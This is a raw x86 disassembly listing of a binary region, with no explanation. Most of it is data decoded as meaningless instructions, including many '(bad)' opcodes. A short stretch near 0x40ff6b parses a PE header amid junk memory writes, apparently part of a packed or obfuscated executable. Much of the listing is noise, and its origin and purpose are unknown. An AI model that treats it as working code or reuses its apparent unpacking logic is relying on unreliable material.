  40f8ac:	jl     0x40f8ab
  40f8ae:	dec    eax
  40f8af:	push   esp
  40f8b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8b1:	add    BYTE PTR [edi-0x50],0xac
  40f8b5:	jl     0x40f91f
  40f8b7:	sub    DWORD PTR [ebx-0x7a],esp
  40f8ba:	ret    0xa139
  40f8bd:	(bad)  
  40f8bf:	test   al,0x45
  40f8c1:	mov    ?,WORD PTR [edx]
  40f8c3:	call   0xba433660
  40f8c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8c9:	dec    ecx
  40f8ca:	dec    edi
  40f8cb:	(bad)  
  40f8cc:	mov    esi,DWORD PTR [edi-0x1d0d9f26]
  40f8d2:	push   0x69
  40f8d4:	sar    DWORD PTR [bx-0x526d],0x3
  40f8da:	push   ecx
  40f8db:	mov    BYTE PTR [eax-0x31],al
  40f8de:	iret   
  40f8df:	pop    es
  40f8e0:	add    ecx,DWORD PTR [edx]
  40f8e2:	das    
  40f8e3:	aas    
  40f8e4:	sub    ah,dl
  40f8e6:	sbb    DWORD PTR [ebx],esp
  40f8e8:	cld    
  40f8e9:	sbb    al,0x43
  40f8eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8ec:	jg     0x40f966
  40f8ee:	mov    ebx,0x45d16248
  40f8f3:	push   0xf9fea730
  40f8f8:	inc    ebx
  40f8f9:	stos   DWORD PTR es:[edi],eax
  40f8fa:	outs   dx,DWORD PTR ds:[esi]
  40f8fb:	inc    edx
  40f8fc:	sbb    al,BYTE PTR [eax]
  40f8fe:	loop   0x40f927
  40f900:	sub    eax,0x190c4986
  40f905:	jno    0x40f914
  40f907:	xchg   DWORD PTR [eax+0x69545b0e],esi
  40f90d:	or     dh,bh
  40f90f:	or     BYTE PTR [edi+eiz*1+0x1],bl
  40f913:	xchg   ebp,eax
  40f914:	sbb    DWORD PTR [edx],esp
  40f916:	ins    BYTE PTR es:[edi],dx
  40f917:	repz (bad) [ebx+0x56]
  40f91b:	(bad)  
  40f91c:	gs (bad) 
  40f91e:	jno    0x40f974
  40f920:	gs jl  0x40f94c
  40f923:	popf   
  40f924:	pop    ds
  40f925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f926:	fdivr  QWORD PTR [ecx+0x4eb97df9]
  40f92c:	pushf  
  40f92d:	out    0xdb,al
  40f92f:	ds and ch,al
  40f932:	fucomi st,st(0)
  40f934:	in     eax,dx
  40f935:	mov    edi,0x3c858c9c
  40f93a:	inc    esi
  40f93b:	dec    ebx
  40f93c:	popa   
  40f93d:	xlat   BYTE PTR ds:[ebx]
  40f93e:	pop    ebp
  40f93f:	jle    0x40f9bf
  40f941:	sahf   
  40f942:	and    eax,0xdbfa92c3
  40f947:	and    dh,0x27
  40f94a:	outs   dx,BYTE PTR ds:[esi]
  40f94b:	mov    ds:0x8397f9f0,al
  40f950:	repz repnz mov ch,0x8f
  40f954:	int3   
  40f955:	sbb    ch,bh
  40f957:	enter  0x4ed6,0xa9
  40f95b:	outs   dx,BYTE PTR ds:[esi]
  40f95c:	xor    dh,bh
  40f95e:	(bad)  
  40f95f:	mov    ds:0x6438040,al
  40f964:	inc    ebx
  40f965:	iret   
  40f966:	mov    ecx,0x644787b8
  40f96b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f96c:	mov    cl,0x5
  40f96e:	mov    ebx,0x3071451d
  40f973:	(bad)  
  40f974:	in     al,dx
  40f975:	add    al,al
  40f977:	xor    eax,0x2d64efef
  40f97c:	outs   dx,DWORD PTR ds:[esi]
  40f97d:	ficomp WORD PTR [ebx]
  40f97f:	ret    0x49c0
  40f982:	mov    ebx,0x604fa6ac
  40f987:	ins    DWORD PTR es:[edi],dx
  40f988:	cld    
  40f989:	js     0x40f9fc
  40f98b:	outs   dx,DWORD PTR ds:[esi]
  40f98c:	fcom   DWORD PTR [edi-0x4526d367]
  40f992:	shl    ah,1
  40f994:	shl    DWORD PTR [ecx],0x2d
  40f997:	cli    
  40f998:	in     al,dx
  40f999:	clc    
  40f99a:	cmp    dl,al
  40f99c:	adc    bh,BYTE PTR [ebx-0x4edec9e6]
  40f9a2:	mov    eax,0x4bb3d293
  40f9a7:	sub    BYTE PTR [eax],0x26
  40f9aa:	sbb    eax,0x5d042dd1
  40f9af:	mov    esp,0xdc70bade
  40f9b4:	dec    ebp
  40f9b5:	out    0x99,eax
  40f9b7:	inc    ecx
  40f9b8:	pop    ecx
  40f9b9:	xchg   ebp,eax
  40f9ba:	cld    
  40f9bb:	mov    ebp,ebp
  40f9bd:	popf   
  40f9be:	leave  
  40f9bf:	push   ss
  40f9c0:	ins    BYTE PTR es:[edi],dx
  40f9c1:	jecxz  0x40f97c
  40f9c3:	popa   
  40f9c4:	stos   BYTE PTR es:[edi],al
  40f9c5:	jecxz  0x40fa02
  40f9c7:	out    0xe9,al
  40f9c9:	add    ch,bl
  40f9cb:	outs   dx,DWORD PTR ds:[esi]
  40f9cc:	mov    WORD PTR [ecx+0x75f8728a],fs
  40f9d2:	xchg   BYTE PTR [ecx-0x6e],dl
  40f9d5:	je     0x40f993
  40f9d7:	std    
  40f9d8:	and    edi,edx
  40f9da:	jmp    0x40f9d7
  40f9dc:	lahf   
  40f9dd:	or     al,0x8f
  40f9df:	push   0x21
  40f9e1:	add    BYTE PTR [ebx-0x48cd658d],0xb5
  40f9e8:	cmp    BYTE PTR [edi+ecx*1+0x16333e3b],bl
  40f9ef:	dec    esp
  40f9f0:	fwait
  40f9f1:	js     0x40f9bc
  40f9f3:	mov    al,ds:0x232dcd77
  40f9f8:	outs   dx,BYTE PTR ds:[esi]
  40f9f9:	mov    BYTE PTR [ebx+0x715594a0],0x23
  40fa00:	pop    ebp
  40fa01:	mov    dh,0x4f
  40fa03:	xor    eax,0x1c4c05a8
  40fa08:	adc    ebp,DWORD PTR [ebx]
  40fa0a:	iret   
  40fa0b:	push   0x6721ec1e
  40fa10:	mov    al,0x23
  40fa12:	pop    esi
  40fa13:	xchg   DWORD PTR [edx+0x6e5b7de4],edx
  40fa19:	push   esi
  40fa1a:	push   ecx
  40fa1b:	loope  0x40fa29
  40fa1d:	and    ch,BYTE PTR [eax-0x67d0650a]
  40fa23:	(bad)  
  40fa24:	js     0x40fa28
  40fa26:	int    0x29
  40fa28:	dec    esi
  40fa29:	fwait
  40fa2a:	je     0x40fa11
  40fa2c:	mov    WORD PTR [eax-0x1ccf29e5],cs
  40fa32:	inc    esp
  40fa33:	fidivr WORD PTR [esi]
  40fa35:	das    
  40fa36:	jmp    0x81be:0xbe11869f
  40fa3d:	or     BYTE PTR [esi+0x34c0048b],0xc3
  40fa44:	and    BYTE PTR [edx],dh
  40fa46:	and    DWORD PTR [esi-0x31],edx
  40fa49:	test   DWORD PTR [edi+ebp*2+0x58cf4dad],ebp
  40fa50:	loopne 0x40fa73
  40fa52:	mov    esi,ebx
  40fa54:	outs   dx,DWORD PTR ds:[esi]
  40fa55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa56:	mov    dl,ah
  40fa58:	int    0xf3
  40fa5a:	ins    BYTE PTR es:[edi],dx
  40fa5b:	(bad)  
  40fa5c:	jmp    0x40fa23
  40fa5e:	ss push cs
  40fa60:	syscall 
  40fa62:	rcl    BYTE PTR [ebp+esi*8-0xf017d40],0xbe
  40fa6a:	ror    dl,1
  40fa6c:	push   eax
  40fa6d:	mov    ebx,0xd1b7cd11
  40fa72:	jbe    0x40fad6
  40fa74:	ins    BYTE PTR es:[edi],dx
  40fa75:	dec    edi
  40fa76:	test   DWORD PTR [ebx+0x2c9e27c6],esp
  40fa7c:	or     ebp,DWORD PTR [esi]
  40fa7e:	imul   ebp,DWORD PTR [ebp+ebp*4-0x573b31a3],0x9274aa5
  40fa89:	inc    esp
  40fa8a:	mov    edi,0x42b5bc9
  40fa8f:	into   
  40fa90:	pop    edi
  40fa91:	test   DWORD PTR [eax+0x20],esp
  40fa94:	adc    eax,0x3a16244a
  40fa99:	rcl    DWORD PTR [edx-0xb636ced],cl
  40fa9f:	push   ebx
  40faa0:	enter  0xbb21,0x64
  40faa4:	add    eax,0x462b8892
  40faa9:	aas    
  40faaa:	sahf   
  40faab:	popa   
  40faac:	and    BYTE PTR [edi],0x34
  40faaf:	add    ecx,ebp
  40fab1:	dec    ebx
  40fab2:	cmp    bl,BYTE PTR [ebp+0x66cc955f]
  40fab8:	outs   dx,BYTE PTR ds:[esi]
  40fab9:	lods   eax,DWORD PTR ds:[esi]
  40faba:	cmc    
  40fabb:	add    al,BYTE PTR [ecx-0x2257d8c7]
  40fac1:	push   ebp
  40fac2:	aaa    
  40fac3:	loop   0x40fa5c
  40fac5:	(bad)  
  40fac6:	or     BYTE PTR [edx],0xcd
  40fac9:	scas   al,BYTE PTR es:[edi]
  40faca:	aas    
  40facb:	fild   QWORD PTR [ebp+ecx*1+0x0]
  40facf:	mov    ebp,0x200f94b4
  40fad4:	dec    edi
  40fad5:	sbb    eax,0x1277197e
  40fada:	inc    ebx
  40fadb:	or     DWORD PTR [esi-0x100de574],edi
  40fae1:	inc    ebp
  40fae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fae3:	cmp    eax,DWORD PTR [esi+0x47]
  40fae6:	les    ebx,FWORD PTR [esi]
  40fae8:	push   ebx
  40fae9:	xchg   edx,eax
  40faea:	jmp    0x40fb28
  40faec:	mul    DWORD PTR [edx+0x9]
  40faef:	dec    edx
  40faf0:	xchg   BYTE PTR [ebx+0x42],ah
  40faf3:	mov    ecx,0x90392e7e
  40faf8:	lea    esi,[ebp+0x298c0763]
  40fafe:	repnz daa 
  40fb00:	call   0x2308:0xa41523f9
  40fb07:	aad    0x4a
  40fb09:	fidiv  WORD PTR [edx+ebx*1+0x16]
  40fb0d:	repz fwait
  40fb0f:	out    dx,eax
  40fb10:	push   ebp
  40fb11:	cmp    al,0x5e
  40fb13:	rcl    BYTE PTR [edx-0x4d],cl
  40fb16:	call   0x1625efa1
  40fb1b:	mov    eax,0x2774c586
  40fb20:	add    DWORD PTR [edi],ebp
  40fb22:	out    dx,eax
  40fb23:	pop    esp
  40fb24:	push   ebx
  40fb25:	repz sub al,0xbe
  40fb28:	imul   esi,DWORD PTR [ebx+ebx*4],0x5c
  40fb2c:	dec    ebx
  40fb2d:	ja     0x40fb26
  40fb2f:	jmp    0xa51f:0x72181536
  40fb36:	ss scas eax,DWORD PTR es:[edi]
  40fb38:	push   eax
  40fb39:	adc    eax,0x220901db
  40fb3e:	pop    ds
  40fb3f:	mov    bh,0x82
  40fb41:	mov    ecx,0x9aea628d
  40fb46:	je     0x40fb76
  40fb48:	mov    esi,0x4f9fcff8
  40fb4d:	add    dh,BYTE PTR [esi+eiz*1]
  40fb50:	jmp    0x3f77:0x44e31228
  40fb57:	sub    al,0x95
  40fb59:	or     BYTE PTR [esi+0x6b1ce814],0x38
  40fb60:	push   esi
  40fb61:	mov    fs,WORD PTR [esi-0x6f2f5e3e]
  40fb67:	aad    0xcb
  40fb69:	pop    ss
  40fb6a:	fild   WORD PTR [esi-0x7a]
  40fb6d:	and    eax,0xb6674e20
  40fb72:	dec    edi
  40fb73:	lock stc 
  40fb75:	jl     0x40fb51
  40fb77:	test   DWORD PTR [ecx+0x579fb239],esp
  40fb7d:	jno    0x40fbdd
  40fb7f:	or     DWORD PTR [esi],0xffffffc1
  40fb82:	(bad)  
  40fb83:	je     0x40fbf3
  40fb85:	mov    ds:0x9ac02524,eax
  40fb8a:	dec    ecx
  40fb8b:	xor    eax,0xba9f70be
  40fb90:	(bad)  
  40fb91:	cwde   
  40fb92:	fwait
  40fb93:	mov    edi,0xd9df11c8
  40fb98:	add    al,0x75
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x33
  40fbb3:	pop    ebx
  40fbb4:	lods   eax,DWORD PTR ds:[esi]
  40fbb5:	sbb    al,0x82
  40fbb7:	mov    cl,0x70
  40fbb9:	jo     0x40fb5e
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fb77
  40fbbf:	pop    ds
  40fbc0:	add    dh,BYTE PTR [ebx+0x460ed3ba]
  40fbc6:	ret    0x331a
  40fbc9:	sbb    eax,0x64767bfa
  40fbce:	fisub  WORD PTR [esi+0x71aabc88]
  40fbd4:	adc    bh,ch
  40fbd6:	daa    
  40fbd7:	lahf   
  40fbd8:	enter  0x9b51,0x3d
  40fbdc:	lock rol edi,cl
  40fbdf:	outs   dx,BYTE PTR ds:[esi]
  40fbe0:	retf   0x3f1
  40fbe3:	jbe    0x40fc06
  40fbe5:	pop    ss
  40fbe6:	add    ebp,ebx
  40fbe8:	mov    edx,0x379d03c0
  40fbed:	mov    DWORD PTR [ecx-0x1e51ea7],esp
  40fbf3:	mov    bl,0x62
  40fbf5:	jno    0x40fbbc
  40fbf7:	dec    ebp
  40fbf8:	mov    cl,0xa4
  40fbfa:	stc    
  40fbfb:	test   eax,0x7689dd68
  40fc00:	adc    BYTE PTR [edx],cl
  40fc02:	adc    eax,0x15db04c2
  40fc07:	ret    0xbdc3
  40fc0a:	mov    ecx,0x6f5c7bc1
  40fc0f:	lds    ebx,FWORD PTR [esi]
  40fc11:	enter  0xe1c2,0xf6
  40fc15:	out    dx,eax
  40fc16:	lods   al,BYTE PTR ds:[esi]
  40fc17:	cwde   
  40fc18:	fmul   QWORD PTR [esi-0x901f809]
  40fc1e:	sub    eax,0x26137e26
  40fc23:	mov    bl,0xa7
  40fc25:	add    BYTE PTR ss:[edi+0xc961947],dl
  40fc2c:	fs loop 0x40fc26
  40fc2f:	mov    BYTE PTR [edi],ah
  40fc31:	cmp    BYTE PTR [ecx],bh
  40fc33:	cmp    ebp,edx
  40fc35:	into   
  40fc36:	(bad)  
  40fc37:	sub    DWORD PTR [ebx],ebx
  40fc39:	mov    WORD PTR [ebp-0x1f155d19],gs
  40fc3f:	sbb    eax,0x32fb7368
  40fc44:	cmc    
  40fc45:	out    0x1b,eax
  40fc47:	imul   edx,DWORD PTR [ecx+0x64],0xffffffe2
  40fc4b:	xchg   esp,eax
  40fc4c:	jg     0x40fcbb
  40fc4e:	in     al,dx
  40fc4f:	ret    
  40fc50:	and    al,0xb9
  40fc52:	fldcw  WORD PTR [esi-0x28]
  40fc55:	xor    BYTE PTR [ebx],dl
  40fc57:	xchg   ecx,eax
  40fc58:	test   ch,ah
  40fc5a:	(bad)
  40fc5d:	and    ebp,eax
  40fc5f:	retf   
  40fc60:	in     eax,0x59
  40fc62:	je     0x40fc1b
  40fc64:	cmp    al,0x15
  40fc66:	mov    edi,0x7dfc6dd4
  40fc6b:	mov    bh,0xdc
  40fc6d:	adc    al,0x4a
  40fc6f:	add    bh,BYTE PTR [eax+edx*4-0x4d1121ab]
  40fc76:	pop    ds
  40fc77:	pop    esp
  40fc78:	sbb    esi,DWORD PTR [ebx+edx*1-0x63773457]
  40fc7f:	mov    ds:0xfd26c1f8,al
  40fc84:	(bad)  
  40fc85:	or     edx,DWORD PTR [esi+0x16]
  40fc88:	mov    gs,esp
  40fc8a:	sub    BYTE PTR [edi],0x59
  40fc8d:	jge    0x40fc23
  40fc8f:	ret    
  40fc90:	aam    0xc9
  40fc92:	push   edi
  40fc93:	dec    esp
  40fc94:	clc    
  40fc95:	(bad)  
  40fc96:	iret   
  40fc97:	adc    al,BYTE PTR [ebp+0x5f023e8c]
  40fc9d:	xlat   BYTE PTR ds:[ebx]
  40fc9e:	cmp    eax,DWORD PTR [eax]
  40fca0:	cdq    
  40fca1:	outs   dx,BYTE PTR ds:[esi]
  40fca2:	cmc    
  40fca3:	mov    ecx,0x575aab18
  40fca8:	mov    ebp,DWORD PTR [ebx+0x3e7d2d15]
  40fcae:	scas   al,BYTE PTR es:[edi]
  40fcaf:	out    0xe1,eax
  40fcb1:	cmc    
  40fcb2:	push   ebx
  40fcb3:	and    DWORD PTR [edx+0x60af0678],edx
  40fcb9:	or     al,0x37
  40fcbb:	adc    al,0xcc
  40fcbd:	lds    esi,FWORD PTR [ebx-0x52]
  40fcc0:	idiv   BYTE PTR [esi-0x3f49706f]
  40fcc6:	mov    ebp,0xf2f8c65d
  40fccb:	test   BYTE PTR [edi-0xe],ah
  40fcce:	stc    
  40fccf:	sbb    cl,al
  40fcd1:	fidivr DWORD PTR [ebp-0x1cd863db]
  40fcd7:	and    DWORD PTR [ebx-0x51b6a345],eax
  40fcdd:	outs   dx,BYTE PTR ds:[esi]
  40fcde:	inc    ecx
  40fcdf:	loop   0x40fcf3
  40fce1:	add    dl,BYTE PTR [esi-0x5d9a6f2a]
  40fce7:	cmp    dh,bl
  40fce9:	push   es
  40fcea:	mov    ch,BYTE PTR [ebx+0x7a]
  40fced:	sub    ecx,0x3233451a
  40fcf3:	loope  0x40fd49
  40fcf5:	loopne 0x40fd24
  40fcf7:	out    0x16,eax
  40fcf9:	lods   al,BYTE PTR ds:[esi]
  40fcfa:	lds    esp,FWORD PTR [ebx+ecx*8-0x257e5ded]
  40fd01:	(bad)  
  40fd02:	jl     0x40fce4
  40fd04:	(bad)  
  40fd06:	fwait
  40fd07:	dec    edi
  40fd08:	fiadd  WORD PTR [ebx]
  40fd0a:	(bad)  
  40fd0b:	jae    0x40fd37
  40fd0d:	aad    0xff
  40fd0f:	cdq    
  40fd10:	cmp    al,0x8f
  40fd13:	mov    ch,BYTE PTR [ecx-0x7]
  40fd16:	clc    
  40fd17:	xchg   ebx,eax
  40fd18:	or     ebx,DWORD PTR [edi+0x3ec33d9]
  40fd1e:	pop    eax
  40fd1f:	jl     0x40fd48
  40fd21:	mov    esi,0x6329d454
  40fd26:	cmp    dh,BYTE PTR [ecx-0x322f6744]
  40fd2c:	and    eax,0xa83c66ac
  40fd31:	add    BYTE PTR [edx+ebx*8-0x4331f15f],bh
  40fd38:	arpl   ax,bp
  40fd3a:	jno    0x40fdab
  40fd3c:	pop    eax
  40fd3d:	adc    eax,0x976ddce
  40fd42:	mov    bh,0x49
  40fd44:	jmp    0x40fd55
  40fd46:	lahf   
  40fd47:	aad    0x56
  40fd49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd4a:	push   0xdc1ec438
  40fd4f:	adc    edi,ebp
  40fd51:	push   ebp
  40fd52:	das    
  40fd53:	fimul  WORD PTR [esi]
  40fd55:	or     DWORD PTR [eax+edi*8],ecx
  40fd58:	xor    eax,0x34dc94ed
  40fd5e:	and    BYTE PTR [ecx+0x24],al
  40fd61:	stos   BYTE PTR es:[edi],al
  40fd62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd63:	sbb    eax,0x32eb6466
  40fd68:	push   esi
  40fd69:	mov    ecx,0xc8ed9066
  40fd6e:	pop    ss
  40fd6f:	cs cmp eax,0x3861b276
  40fd75:	and    DWORD PTR [edi+eiz*8],esi
  40fd78:	xlat   BYTE PTR ds:[ebx]
  40fd79:	test   eax,0x24c9fccb
  40fd7e:	cmp    al,0xb9
  40fd80:	ins    BYTE PTR es:[edi],dx
  40fd81:	ret    0xd357
  40fd84:	fcmovnb st,st(3)
  40fd86:	sub    BYTE PTR [esi],0x3a
  40fd89:	mov    BYTE PTR [eax+0xe3707],dl
  40fd8f:	test   eax,0x68528b81
  40fd94:	sub    esi,eax
  40fd96:	hlt    
  40fd97:	sbb    eax,0x15ab5d3f
  40fd9c:	sahf   
  40fd9d:	ret    0x14d
  40fda0:	mov    ds:0x258b8fff,al
  40fda5:	sub    ch,dh
  40fda7:	mov    BYTE PTR [eax],bl
  40fda9:	jle    0x40fde9
  40fdab:	mov    bh,0x1c
  40fdad:	inc    esp
  40fdae:	repnz or cl,BYTE PTR ds:[eax+0x32]
  40fdb3:	mov    edi,0xa4ce9589
  40fdb8:	popf   
  40fdb9:	outs   dx,BYTE PTR ds:[esi]
  40fdba:	retf   0x6eb9
  40fdbd:	adc    esi,ebp
  40fdbf:	push   esp
  40fdc0:	jo     0x40fd89
  40fdc2:	sar    DWORD PTR [ecx-0x443b7d65],cl
  40fdc8:	xor    DWORD PTR [ebx-0x140a7a38],ebx
  40fdce:	lods   al,BYTE PTR ds:[esi]
  40fdcf:	jns    0x40fe47
  40fdd1:	xor    ebp,DWORD PTR [ecx]
  40fdd3:	daa    
  40fdd4:	jecxz  0x40fe38
  40fdd6:	(bad)  [edi-0xc]
  40fdd9:	cwde   
  40fdda:	push   ss
  40fddb:	retf   0x704a
  40fdde:	or     eax,0xb750ce82
  40fde3:	sar    BYTE PTR es:[esi+0x4c],cl
  40fde7:	icebp  
  40fde8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fde9:	jbe    0x40fe0c
  40fdeb:	into   
  40fdec:	ss mov eax,esi
  40fdef:	aad    0xd0
  40fdf1:	and    dl,dh
  40fdf3:	scas   eax,DWORD PTR es:[edi]
  40fdf4:	xor    ah,cl
  40fdf6:	dec    ebx
  40fdf7:	jne    0x40fe48
  40fdf9:	les    edi,FWORD PTR [edx-0x2c]
  40fdfc:	arpl   WORD PTR [esi+0xf506bd],sp
  40fe02:	sti    
  40fe03:	enter  0xe8de,0xda
  40fe07:	scas   eax,DWORD PTR es:[edi]
  40fe08:	mov    cl,0xca
  40fe0a:	std    
  40fe0b:	inc    edx
  40fe0c:	aaa    
  40fe0d:	fcom   QWORD PTR [ebx+edx*8+0x37ee87d0]
  40fe14:	xlat   BYTE PTR ds:[ebx]
  40fe15:	test   BYTE PTR [ebx],dh
  40fe17:	add    BYTE PTR [ecx-0x76],ah
  40fe1a:	sbb    al,0x19
  40fe1c:	or     BYTE PTR [ebx+0x563fb9b7],dh
  40fe22:	cmp    al,bh
  40fe24:	lods   al,BYTE PTR ds:[esi]
  40fe25:	xor    esi,edx
  40fe27:	or     dl,BYTE PTR [edx-0x2c55e8ae]
  40fe2d:	arpl   WORD PTR [esi],cx
  40fe2f:	sti    
  40fe30:	jmp    0x8a1be8a8
  40fe35:	das    
  40fe36:	(bad)  
  40fe37:	inc    ebx
  40fe38:	push   eax
  40fe39:	int3   
  40fe3a:	xchg   ebp,eax
  40fe3b:	pop    esi
  40fe3c:	popa   
  40fe3d:	inc    edx
  40fe3e:	mov    al,0x12
  40fe40:	mov    edi,DWORD PTR [ecx-0x4e]
  40fe43:	dec    ebp
  40fe44:	jnp    0x40fe9e
  40fe46:	mov    al,0xc8
  40fe48:	je     0x40fe91
  40fe4a:	dec    DWORD PTR [edx+0x54388aa3]
  40fe50:	xor    BYTE PTR [eax+0x17c6c368],dh
  40fe56:	inc    ebp
  40fe57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe58:	jmp    0x40feb5
  40fe5a:	jb     0x40fe6f
  40fe5c:	inc    edi
  40fe5d:	push   ebx
  40fe5e:	jno    0x40fe38
  40fe60:	push   ebx
  40fe61:	shl    esp,1
  40fe63:	fwait
  40fe64:	inc    ebx
  40fe65:	pop    es
  40fe66:	jno    0x40fe96
  40fe68:	inc    ebx
  40fe69:	cmp    ch,BYTE PTR [ebx-0xbc675fd]
  40fe6f:	xlat   BYTE PTR ds:[ebx]
  40fe70:	scas   al,BYTE PTR es:[edi]
  40fe71:	ins    BYTE PTR es:[edi],dx
  40fe72:	xor    ah,BYTE PTR [ecx+ecx*4]
  40fe75:	push   eax
  40fe76:	nop
  40fe77:	add    BYTE PTR [ecx+0xee24431],0x1f
  40fe7e:	scas   eax,DWORD PTR es:[edi]
  40fe7f:	pcmpeqd mm6,QWORD PTR [esi+0xa391fd6]
  40fe86:	js     0x40fe9e
  40fe88:	cdq    
  40fe89:	cmp    al,0xd0
  40fe8b:	ss mov ch,0x61
  40fe8e:	and    al,0xbc
  40fe90:	or     BYTE PTR [edx],0xf6
  40fe93:	dec    ecx
  40fe94:	sub    al,0x79
  40fe96:	or     al,0x60
  40fe98:	cmp    BYTE PTR [edx+0x72],dl
  40fe9b:	das    
  40fe9c:	push   0x38
  40fe9e:	jmp    0x7151:0x96836d93
  40fea5:	cld    
  40fea6:	push   esi
  40fea7:	mov    ds:0xb2bbc745,al
  40feac:	aam    0x45
  40feae:	(bad)  
  40feaf:	sbb    ebx,esi
  40feb1:	mov    ah,0xb4
  40feb3:	sbb    edi,esp
  40feb5:	inc    ebx
  40feb6:	fimul  DWORD PTR [esi-0x51dc0c37]
  40febc:	arpl   WORD PTR [edx],ax
  40febe:	loope  0x40fe42
  40fec0:	mov    al,ds:0x2f0b586a
  40fec5:	sub    ah,BYTE PTR [esi]
  40fec7:	sbb    ebp,DWORD PTR [eax-0x37]
  40feca:	jp     0x40ff44
  40fecc:	test   BYTE PTR [eax+0xdb616fd],0x18
  40fed3:	dec    esp
  40fed4:	push   cs
  40fed5:	xor    bl,BYTE PTR [ecx-0x28b67466]
  40fedb:	dec    esp
  40fedc:	fimul  DWORD PTR [edi-0x2dfd45d2]
  40fee2:	cld    
  40fee3:	sbb    BYTE PTR [ebx+0x4c],cl
  40fee6:	outs   dx,DWORD PTR ds:[esi]
  40fee7:	mov    eax,ds:0x8beb44db
  40feec:	call   0x8b159cbf
  40fef1:	and    BYTE PTR [edx-0x20],dh
  40fef4:	pop    esi
  40fef5:	inc    BYTE PTR [ecx]
  40fef7:	jmp    0x40ff5c
  40fef9:	push   esp
  40fefa:	mov    WORD PTR [edi+0x4c838faf],es
  40ff00:	es ror eax,0xde
  40ff04:	lds    ebx,FWORD PTR [esi]
  40ff06:	sar    DWORD PTR [eax+0x48],1
  40ff09:	mov    ah,0xd2
  40ff0b:	dec    esp
  40ff0c:	sub    al,0x96
  40ff0e:	and    eax,0x9d0a5149
  40ff13:	loop   0x40fe9a
  40ff15:	or     ebp,DWORD PTR [si]
  40ff18:	test   eax,0x1c297024
  40ff1d:	push   ebp
  40ff1e:	add    al,0x32
  40ff20:	sub    cl,ch
  40ff22:	mov    WORD PTR [ebp+edx*2-0x7d2c0fcf],?
  40ff29:	jb     0x40feb9
  40ff2b:	mov    WORD PTR [ecx-0x2d],ss
  40ff2e:	dec    ebp
  40ff2f:	push   eax
  40ff30:	and    DWORD PTR ds:0xb1e63d25,0xa781ee0b
  40ff3a:	ins    BYTE PTR es:[edi],dx
  40ff3b:	fnsave [edx-0x4b]
  40ff3e:	sahf   
  40ff3f:	loopne 0x40ff0f
  40ff41:	cmp    al,0x49
  40ff43:	jnp    0x40ff5f
  40ff45:	mov    bl,0x5a
  40ff47:	pop    ebp
  40ff48:	mov    ah,0x24
  40ff4a:	or     ebx,DWORD PTR [ebx]
  40ff4c:	mov    ds:0xba3a2cf1,al
  40ff52:	mov    dh,0x6e
  40ff54:	mov    WORD PTR [esi-0x7a8b1fac],ds
  40ff5a:	enter  0xbb0a,0x1f
  40ff5e:	sbb    DWORD PTR cs:[ecx+0x6],ebp
  40ff62:	repz jnp 0x40fef7
  40ff65:	std    
  40ff66:	clc    
  40ff67:	in     eax,0xc3
  40ff69:	inc    eax
  40ff6a:	dec    edx
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e134,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	push   ecx
  40ffdd:	in     al,dx
  40ffde:	mov    ds:0x70bd35d3,al
  40ffe3:	jo     0x40ff88
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x41004b
  40ffe9:	pop    edi
  40ffea:	(bad)  
  40ffeb:	sub    al,0x30
  40ffed:	pop    esp
  40ffee:	xchg   BYTE PTR [esp+ebp*4+0x10522d21],ah
  40fff5:	retf   
  40fff6:	or     bh,BYTE PTR [edx]
  40fff8:	inc    ebx
  40fff9:	and    bl,BYTE PTR [ebx+0x3f68cb0f]
  40ffff:	enter  0xe526,0x1f
  410003:	out    0x4e,eax
  410005:	pop    esi
  410006:	xchg   BYTE PTR [eax+eiz*8-0x28],dh
  41000a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41000b:	pushf  
  41000c:	idiv   DWORD PTR [edx-0x61943fc8]
  410012:	push   edi
  410013:	cmc    
  410014:	push   edi
  410015:	pop    ebp
  410016:	dec    ecx
  410017:	sub    DWORD PTR [ebx+0x46],ecx
  41001a:	push   edx
  41001b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41001c:	add    BYTE PTR [edi-0x7],dh
  41001f:	jg     0x410044
  410021:	dec    esp
  410022:	outs   dx,DWORD PTR ds:[esi]
  410023:	call   esi
  410025:	adc    al,0xab
  410027:	mov    ds:0x6f199c18,eax
